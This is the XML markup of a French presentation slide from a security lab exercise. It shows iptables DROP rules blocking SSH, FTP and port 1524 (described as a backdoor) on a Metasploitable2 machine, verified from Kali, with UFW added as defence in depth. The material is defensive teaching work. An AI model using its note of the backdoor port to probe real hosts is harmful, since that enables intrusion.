                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="302"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="21" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="302"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="22" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="23" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="304"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="24" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="304"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="25" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="26" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="303"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="27" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="303"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="28" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="29" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="305"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="30" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="305"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="31" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="32" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="306"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="33" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="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 grpId="0"/>
      <p:bldP spid="299" grpId="0"/>
      <p:bldP spid="300" grpId="0" animBg="1"/>
      <p:bldP spid="302" grpId="0"/>
      <p:bldP spid="303" grpId="0" animBg="1"/>
      <p:bldP spid="305" grpId="0"/>
      <p:bldP spid="30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3"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="185" name="Google Shape;185;p10"/>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i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>Blocage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t> réseau : iptables &amp; UFW</a:t>
            </a:r>
            <a:endParaRPr sz="2700" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="186" name="Google Shape;186;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="5212080" cy="4114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48148"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0E9E5E"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>iptables -A INPUT -p </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>dport</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> &lt;port&gt; -j DROP</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800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="5B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>appliqué </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>successivement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> sur les ports 22 (SSH), 21 (FTP) et 1524 (backdoor)</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800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </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800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Vérification</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>systématique</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>depuis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> Kali</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800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="5B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>→ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>chaque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> tentative se </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>solde</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> par un timeout (« Connection timed out »)</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800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </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800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="5B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>UFW </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>installé</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>côté</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>défense</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>complémentaire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>défense</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>profondeur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="187" name="Google Shape;187;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7228080" y="1289304"/>
            <a:ext cx="3283201" cy="2313432"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2767"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="22225" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="0E86C0"/>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8" name="Google Shape;188;p10" descr="/sessions/intelligent-upbeat-noether/mnt/outputs/pptx_images/fig05_ssh_block.jpg"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7310376" y="1371600"/>
            <a:ext cx="3118609" cy="2148840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="189" name="Google Shape;189;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7228080" y="3639312"/>
            <a:ext cx="3283201"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Blocage du port SSH (22) — vérifié depuis Kali</a:t>
            </a:r>
            <a:endParaRPr sz="1050" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="190" name="Google Shape;190;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7363607" y="4169664"/>
            <a:ext cx="3012145" cy="2039112"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3139"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="22225" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="0E86C0"/>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1" name="Google Shape;191;p10" descr="/sessions/intelligent-upbeat-noether/mnt/outputs/pptx_images/fig07_port1524_block.jpg"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7445903" y="4251960"/>
            <a:ext cx="2847553" cy="1874520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="192" name="Google Shape;192;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7363607" y="6245352"/>
            <a:ext cx="3012145"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Blocage du port 1524 (backdoor) sur Metasploitable2</a:t>
            </a:r>
            <a:endParaRPr sz="1050" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
